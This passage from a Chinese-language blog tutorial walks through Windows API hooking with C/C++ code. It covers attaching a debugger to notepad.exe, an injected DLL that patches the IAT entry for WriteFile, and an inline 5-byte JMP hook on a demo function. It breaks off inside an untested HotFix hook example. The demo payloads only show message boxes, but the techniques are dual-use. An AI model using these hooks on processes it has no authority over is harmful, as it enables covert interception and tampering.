调试事件为创建进程</span></span><br><span class="line">        <span class="keyword">if</span> (CREATE_PROCESS_DEBUG_EVENT == DebugEvent.dwDebugEventCode)</span><br><span class="line">        &#123;</span><br><span class="line">            OnCreateProcessDebugEvent(&amp;DebugEvent);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调试事件</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (EXCEPTION_DEBUG_EVENT == DebugEvent.dwDebugEventCode)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (OnExceptionDebugEvent(&amp;DebugEvent))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调试进程退出</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (EXIT_PROCESS_DEBUG_EVENT == DebugEvent.dwDebugEventCode)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, dwContinueStatus);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD <span class="title">traverseProcesses</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</span><br><span class="line">    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Create snap Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    BOOL bResult = Process32First(hProcessSnap, &amp;pe32);</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">num</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">while</span> (bResult) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">_bstr_t</span> <span class="title">b</span><span class="params">(pe32.szExeFile)</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(b, <span class="string">&quot;notepad.exe&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;find: &quot;</span>&lt;&lt;b&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt; pe32.th32ProcessID &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> pe32.th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">        bResult = Process32Next(hProcessSnap, &amp;pe32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debugHook</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;attach pid %d\n&quot;</span>, pid);</span><br><span class="line">    <span class="keyword">if</span> (!DebugActiveProcess(pid)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;attach Failed %d\n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    DebugLoop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD pid = traverseProcesses();</span><br><span class="line">    debugHook(pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="注入Hook"><a href="#注入Hook" class="headerlink" title="注入Hook"></a>注入Hook</h2><p>核心思想是修改API代码，使用DLL注入技术，将Hook的代码注入到另一进程，此时DLL在B进程的内存中，就有权限直接修改B内存中的代码了。</p>
<p>以下内容需要了解dll注入技术。</p>
<h3 id="IAT-Hook"><a href="#IAT-Hook" class="headerlink" title="IAT Hook"></a>IAT Hook</h3><p>修改IAT里的函数地址对API进行Hook</p>
<p>把IAT表中API的地址修改为恶意代码地址，就可以实现Hook效果</p>
<p>要hook的dll: 在main函数中计算IAT的位置并且修改对应的代码</p>
<ol>
<li><p>穷举所有模块，找到要hook的模块</p>
</li>
<li><p>修改内存属性</p>
</li>
<li><p>替换iat表中表项</p>
</li>
<li><p>改回内存属性</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载静态链接库</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;urlmon.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">// dllMain函数是程序的入口点</span></span><br><span class="line">HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">PBYTE pAddr = <span class="literal">NULL</span>;</span><br><span class="line">DWORD64 dwRVA;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportDesc;</span><br><span class="line">LPCSTR szLibName;</span><br><span class="line"><span class="keyword">char</span> szDllName[] = <span class="string">&quot;kernel32.dll&quot;</span>;</span><br><span class="line">PIMAGE_THUNK_DATA pThunk;</span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(*FnWriteFile)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE       hFile,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCVOID      lpBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD        nNumberOfBytesToWrite,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPDWORD      lpNumberOfBytesWritten,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line">FnWriteFile pfnOld = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">pfnNew</span><span class="params">(HANDLE       hFile,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCVOID      lpBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD        nNumberOfBytesToWrite,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPDWORD      lpNumberOfBytesWritten,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPOVERLAPPED lpOverlapped)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> szHookText[] = <span class="string">&quot;IBinary -&gt; Iat Hook&quot;</span>;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Successed&quot;</span>, (LPCSTR)lpBuffer, MB_OK);</span><br><span class="line">    <span class="keyword">if</span> (pfnOld != <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfnOld(hFile,</span><br><span class="line">            lpBuffer,</span><br><span class="line">            nNumberOfBytesToWrite,</span><br><span class="line">            lpNumberOfBytesWritten,</span><br><span class="line">            lpOverlapped);<span class="comment">//调用以前的</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">iatHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;开始进行HOOK&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    FARPROC pHookAddress = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;WriteFile&quot;</span>); <span class="comment">//你要HOOK的函数.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">nullptr</span> == pHookAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(TEXT(<span class="string">&quot;获取函数地址失败&quot;</span>));</span><br><span class="line">        MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;获取函数地址失败HOOK&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pfnOld = (FnWriteFile)pHookAddress; <span class="comment">//保存旧的函数指针.</span></span><br><span class="line">    <span class="comment">//解析PE头.寻找IAT.</span></span><br><span class="line"></span><br><span class="line">    HMODULE hModImageBase = GetModuleHandle(<span class="literal">NULL</span>);<span class="comment">//获取当前的ImagBase</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)(DWORD64)hModImageBase; <span class="comment">//获取DOS头</span></span><br><span class="line">    DWORD64 dwTemp = (DWORD64)pDosHead + (DWORD64)pDosHead-&gt;e_lfanew;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)dwTemp;</span><br><span class="line">    PIMAGE_FILE_HEADER pFileHead = (PIMAGE_FILE_HEADER)&amp;pNtHead-&gt;FileHeader;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&amp;pNtHead-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//寻找导出表的位置.</span></span><br><span class="line">    DWORD dwExportLocal = pOptHead-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress; <span class="comment">//找到导出表偏移.</span></span><br><span class="line">    <span class="comment">//定位到导出表</span></span><br><span class="line">    dwTemp = (DWORD64)GetModuleHandle(<span class="literal">NULL</span>) + dwExportLocal;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR   pImport = (PIMAGE_IMPORT_DESCRIPTOR)dwTemp;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR   pCurrent = pImport;</span><br><span class="line">    DWORD64* pFirstThunk; <span class="comment">//导入表子表,也就是IAT存储函数地址的表.</span></span><br><span class="line">    <span class="comment">//遍历导入表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (pCurrent-&gt;Characteristics &amp;&amp; pCurrent-&gt;FirstThunk != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwTemp = pCurrent-&gt;FirstThunk + (DWORD64)GetModuleHandle(<span class="literal">NULL</span>);<span class="comment">//找到导入表</span></span><br><span class="line">        pFirstThunk = (DWORD64*)dwTemp; <span class="comment">//加上偏移才是真正的导入表.</span></span><br><span class="line">        <span class="keyword">while</span> (*(DWORD64*)pFirstThunk != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//遍历子表</span></span><br><span class="line">            <span class="keyword">if</span> (*(DWORD64*)pFirstThunk == (DWORD64)pfnOld)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到要修改的导入表了//修改内存保护属性.写入我们新的函数地址.</span></span><br><span class="line">                DWORD oldProtected;</span><br><span class="line">                VirtualProtect(pFirstThunk, <span class="number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);</span><br><span class="line">                dwTemp = (DWORD64)pfnNew;</span><br><span class="line">                <span class="built_in">memcpy</span>(pFirstThunk, (DWORD64*)&amp;dwTemp, <span class="number">8</span>); <span class="comment">//将变量中保存的函数地址拷贝到导入表中.</span></span><br><span class="line">                VirtualProtect(pFirstThunk, <span class="number">0x1000</span>, oldProtected, &amp;oldProtected);</span><br><span class="line">            &#125;</span><br><span class="line">            pFirstThunk++; <span class="comment">//继续遍历.</span></span><br><span class="line">        &#125;</span><br><span class="line">        pCurrent++; <span class="comment">//每次是加一个导入表结构.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span>&#123;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        iatHook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h3><p>直接修改内存中任意函数的代码，将其劫持至Hook API。劫持后先进行“脱钩”，即能正常调用原函数，执行完毕后再次Hook。</p>
<p>步骤：</p>
<ol>
<li><p>修改被hook函数的前几个字节，使其跳转到恶意函数</p>
</li>
<li><p>恶意函数的操作</p>
<ul>
<li><p>修复函数</p>
</li>
<li><p>执行原函数</p>
</li>
<li><p>执行恶意操作</p>
</li>
<li><p>最后要把函数修改以便下次hook</p>
</li>
</ul>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">// 加载静态链接库</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;urlmon.lib&quot;</span>)</span></span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*FnPrintHello)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">FnPrintHello pfnOld = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BYTE pOldBytes[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">pfnNew</span><span class="params">(HWND    hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT    uType)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">inlineHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;StartHook&quot;</span>, MB_OK);</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    DWORD64 dwAddress;</span><br><span class="line">    BYTE pBuf[<span class="number">5</span>] = &#123; <span class="number">0xE9</span>,<span class="number">0</span>, &#125;;</span><br><span class="line">    PBYTE pByte;</span><br><span class="line">    pfnOld = (FnPrintHello)((<span class="number">0x140011C20</span>LL - <span class="number">0x140001000</span>+ <span class="number">0x1000</span>LL) + (DWORD64)GetModuleHandleA(<span class="string">&quot;Project1.exe&quot;</span>));</span><br><span class="line">    pByte = (PBYTE)pfnOld;</span><br><span class="line">    <span class="comment">// 已经被hook</span></span><br><span class="line">    <span class="keyword">if</span> (pByte[<span class="number">0</span>] == <span class="number">0xE9</span>)<span class="keyword">return</span> FALSE;</span><br><span class="line">    VirtualProtect((LPVOID)pfnOld, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="built_in">memcpy</span>(pOldBytes, pfnOld, <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// 计算相对偏移</span></span><br><span class="line">    dwAddress = (DWORD64)pfnNew - (DWORD64)pfnOld - <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt;hex&lt;&lt; dwAddress &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;pBuf[<span class="number">1</span>], &amp;dwAddress, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">// hook</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pfnOld, pBuf, <span class="number">5</span>);</span><br><span class="line">    VirtualProtect((LPVOID)pfnOld, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">inlineUnHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    BYTE pBuf[<span class="number">5</span>] = &#123; <span class="number">0xE9</span>,<span class="number">0</span>, &#125;;</span><br><span class="line">    PBYTE pByte;</span><br><span class="line">    <span class="comment">// 这里是使用IDA查看的printHello函数地址+基址+text段基址</span></span><br><span class="line">    pfnOld = (FnPrintHello)((<span class="number">0x140011C20</span>LL - <span class="number">0x140001000</span>LL+<span class="number">0x1000</span>)+(DWORD64)GetModuleHandleA(<span class="string">&quot;Project1.exe&quot;</span>));</span><br><span class="line">    pByte = (PBYTE)pfnOld;</span><br><span class="line">    VirtualProtect((LPVOID)pfnOld, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="built_in">memcpy</span>(pBuf, pOldBytes,<span class="number">5</span>);</span><br><span class="line">    <span class="comment">// hook</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pfnOld, pBuf, <span class="number">5</span>);</span><br><span class="line">    VirtualProtect((LPVOID)pfnOld, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">pfnNew</span><span class="params">(HWND    hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT    uType)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> szHookText[] = <span class="string">&quot;IBinary -&gt; Iat Hook&quot;</span>;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Successed&quot;</span>, (LPCSTR)lpText, MB_OK);</span><br><span class="line">    <span class="comment">// unhook</span></span><br><span class="line">    inlineUnHook();</span><br><span class="line"></span><br><span class="line">    BOOL result=FALSE;</span><br><span class="line">    <span class="keyword">if</span> (pfnOld != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        pfnOld();<span class="comment">//调用以前的</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// hook again</span></span><br><span class="line">    inlineHook();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span>&#123;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        inlineHook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>被Hook的程序代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HelloWorld\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里是应用程序自己加载，当然也可以dll注入</span></span><br><span class="line">    LoadLibraryA(<span class="string">&quot;myhackdll.dll&quot;</span>);</span><br><span class="line">    printHello();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="HotFix-Hook"><a href="#HotFix-Hook" class="headerlink" title="HotFix Hook"></a>HotFix Hook</h3><p>上面的Hook方法存在效率问题(每次都需要修改程序的前5字节)，并且不支持多线程。HotFix Hook可以解决这些问题。</p>
<p>API函数以 MOV EDI,EDI开始，并且上方有5个NOP指令。可以利用这7个字节来进行Hook操作。</p>
<p>当API被调用时，先jmp short至上面5个字节，然后再jmp至恶意代码。</p>
<p>代码实现(还未实验)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 